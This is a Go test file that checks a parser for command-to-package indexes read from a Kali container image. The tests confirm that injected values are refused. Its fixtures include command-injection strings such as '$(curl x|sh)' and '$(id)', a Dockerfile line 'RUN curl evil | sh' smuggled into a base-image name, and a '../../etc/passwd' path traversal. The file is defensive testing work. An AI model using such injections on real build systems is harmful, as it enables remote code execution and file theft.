package unsafeexec

import (
	"io"
	"reflect"
	"slices"
	"strings"
	"testing"

	"github.com/blaktron/agentry-cli/pkg/runner/dockerx"
	"github.com/blaktron/agentry-cli/pkg/runner/spec"
)

const base = "ghcr.io/blaktron/agentry-unsafe-kali:2026.09.30.2@sha256:87fa4ae406a9621cef3a4cffcdccf2a512da03141ca21727ce663ca715a191da"

// The fixture's own files, in the shape the image carries them
// (agentry-dockerimages build/agentry-unsafe-kali), plus rows a mirror or
// a mistake could put there.
var (
	commandsTSV = "# command\tpackage: Kali kali-rolling amd64\n" +
		"file\tfile\nstrings\tbinutils\nobjdump\tbinutils\nr2\tradare2\npython3\tpython3-minimal\n7z\t7zip\n" +
		"evil\t$(curl x|sh)\n" + // a package that is no package name
		"$(id)\tfile\n" + // a command that is no command name
		"short\n" // a row without its package
	extrasTSV = "# the extras\n" +
		"pip\tdecompyle3\tdecompyle3==3.9.3\n" +
		"link\tanalyzeHeadless\tghidra\tusr/share/ghidra/support/analyzeHeadless\n"
	ambiguousTSV = "# command\tpackages\nCrack\tcrack,crack-md5\n"
)

func parsed(t *testing.T) *Data {
	t.Helper()
	d, err := Parse(base, []byte(commandsTSV), []byte(extrasTSV), []byte(ambiguousTSV))
	if err != nil {
		t.Fatal(err)
	}
	return d
}

// The index's rows are held to the grammar the image's generator applies:
// a row whose package or command is not a plain name is dropped and
// counted, never placed (plan unsafe-mode.md invariant 3).
func TestParseDropsWhatTheGrammarRefuses(t *testing.T) {
	d := parsed(t)
	if d.Dropped != 3 {
		t.Fatalf("dropped %d rows, want 3", d.Dropped)
	}
	if _, ok := d.index["evil"]; ok {
		t.Fatal("a package that is a shell line was kept")
	}
	if d.index["strings"] != "binutils" || d.index["7z"] != "7zip" {
		t.Fatalf("index = %v", d.index)
	}
}

// The extras list is the closed recipe set, refused whole when a row is
// not: it is maintained by hand, so a bad row is a mistake to fix.
func TestParseRefusesAnExtrasListOutsideTheRecipes(t *testing.T) {
	for name, row := range map[string]string{
		"an unpinned pip requirement": "pip\tx\tx>=1",
		"a URL":                       "pip\tx\thttps://example.com/x.whl",
		"an unknown kind":             "curl\tx\thttps://example.com/x",
		"a shell in the command":      "pip\t$(x)\tx==1",
		"a path climbing out":         "link\tx\tghidra\t../../etc/passwd",
		"an absolute path":            "link\tx\tghidra\t/usr/bin/x",
		"a package that is no name":   "link\tx\tGhidra!\tusr/x",
		"spaces for tabs":             "pip decompyle3 decompyle3==3.9.3",
	} {
		if _, err := Parse(base, nil, []byte(row+"\n"), nil); err == nil {
			t.Errorf("an extras list with %s was accepted", name)
		}
	}
	if _, err := Parse(base, nil, []byte("pip\tx\tx==1\npip\tx\tx==2\n"), nil); err == nil {
		t.Error("an extras list naming a command twice was accepted")
	}
}

// The base is pinned by digest (invariant 9): a tag alone could move under
// the same exec image tag.
func TestTheBaseIsPinnedByDigest(t *testing.T) {
	if _, err := Parse("ghcr.io/blaktron/agentry-unsafe-kali:2026.09.30.2", nil, nil, nil); err == nil {
		t.Fatal("a base without a digest was accepted")
	}
	if _, err := Load(t.Context(), &dockerx.Fake{}, "kalilinux/kali-rolling:latest", io.Discard); err == nil {
		t.Fatal("Load accepted a base without a digest")
	}
}

// Placement is the plan's order: the extras list, then the index. It never
// refuses: what neither places is unplaced (D8), with the packages that
// ship it when the index left it ambiguous. A declared command that is not
// a plain name is unplaced and never looked up.
func TestPlaceExtrasFirstThenTheIndexAndNeverRefuses(t *testing.T) {
	d := parsed(t)
	pkgs, u := d.Place([]string{"strings", "analyzeHeadless", "decompyle3", "objdump", "Crack", "nothere", "a;b", "../x", "file"})
	if want := []string{"binutils", "file", "ghidra"}; !reflect.DeepEqual(pkgs, want) {
		t.Fatalf("packages = %v, want %v (binutils once; ghidra for the link)", pkgs, want)
	}
	if u.Base != base {
		t.Fatalf("base = %q", u.Base)
	}
	var extras []string
	for _, e := range u.Extras {
		extras = append(extras, e.Command+" "+e.String())
	}
	if want := []string{"analyzeHeadless link ghidra:/usr/share/ghidra/support/analyzeHeadless", "decompyle3 pip decompyle3==3.9.3"}; !reflect.DeepEqual(extras, want) {
		t.Fatalf("extras = %v, want %v", extras, want)
	}
	want := []spec.UnplacedCommand{
		{Command: "../x"},
		{Command: "Crack", Candidates: []string{"crack", "crack-md5"}},
		{Command: "a;b"},
		{Command: "nothere"},
	}
	if !reflect.DeepEqual(u.Unplaced, want) {
		t.Fatalf("unplaced = %+v, want %+v", u.Unplaced, want)
	}
}

// An extra wins over the index for the same command: the extras list is
// where a maintainer overrides what a package would give.
func TestAnExtraWinsOverTheIndex(t *testing.T) {
	d, err := Parse(base, []byte("decompyle3\tpython3-decompyle3\n"), []byte("pip\tdecompyle3\tdecompyle3==3.9.3\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	pkgs, u := d.Place([]string{"decompyle3"})
	if len(pkgs) != 0 || len(u.Extras) != 1 || u.Extras[0].Kind != "pip" {
		t.Fatalf("packages %v, extras %+v", pkgs, u.Extras)
	}
}

// Load pulls the base when this machine lacks it, then reads the three
// files out of it without running it.
func TestLoadPullsThenReads(t *testing.T) {
	fake := &dockerx.Fake{ExistingImages: map[string]bool{}, ImageFiles: map[string]string{
		base + ":" + CommandsFile:  commandsTSV,
		base + ":" + ExtrasFile:    extrasTSV,
		base + ":" + AmbiguousFile: ambiguousTSV,
	}}
	d, err := Load(t.Context(), fake, base, io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	if d.index["r2"] != "radare2" {
		t.Fatalf("index = %v", d.index)
	}
	if !slices.ContainsFunc(fake.Ops(), func(op string) bool { return strings.HasPrefix(op, "Pull:"+base) }) {
		t.Fatalf("the base was not pulled: %v", fake.Ops())
	}
}

// The base is anchored at both ends: a digest at the end of the text does
// not carry lines before it into the exec image's FROM (Go's $ anchors at
// the end of the text only). A package never ends in "-", which apt reads
// as "remove". Nothing is placed onto the runner's own name.
func TestTheGrammarsCloseWhatAShellOrAptWouldRead(t *testing.T) {
	if _, err := Parse("kali\nRUN curl evil | sh\nFROM x@sha256:"+strings.Repeat("0", 64), nil, nil, nil); err == nil {
		t.Fatal("a base with lines before its digest was accepted")
	}
	d, err := Parse(base, []byte("objdump\tbinutils-\nagentry-runner\tbinutils\nstrings\tbinutils\n"), nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	if d.Dropped != 2 {
		t.Fatalf("dropped %d rows, want the package ending in - and the runner's name", d.Dropped)
	}
	if _, err := Parse(base, nil, []byte("pip\tagentry-runner\tx==1\n"), nil); err == nil {
		t.Fatal("an extra named for the runner was accepted")
	}
	_, u := d.Place([]string{"agentry-runner"})
	if len(u.Unplaced) != 1 || u.Unplaced[0].Command != "agentry-runner" {
		t.Fatalf("a declared agentry-runner was placed: %+v", u)
	}
}

// Declared commands are looked up as literal names (invariant 3): a shell
// expression is unplaced, and a name that happens to be a real package's
// command, such as apt, is placed as that command, never run.
func TestDeclaredCommandsAreLiteralNames(t *testing.T) {
	d, err := Parse(base, []byte("apt\tapt\n"), nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	pkgs, u := d.Place([]string{"$(x)", "apt"})
	if !reflect.DeepEqual(pkgs, []string{"apt"}) || len(u.Unplaced) != 1 || u.Unplaced[0].Command != "$(x)" {
		t.Fatalf("packages %v, placement %+v", pkgs, u)
	}
	if !reflect.DeepEqual(u.Apt, []spec.AptPlacement{{Command: "apt", Package: "apt"}}) {
		t.Fatalf("apt placements %+v", u.Apt)
	}
}
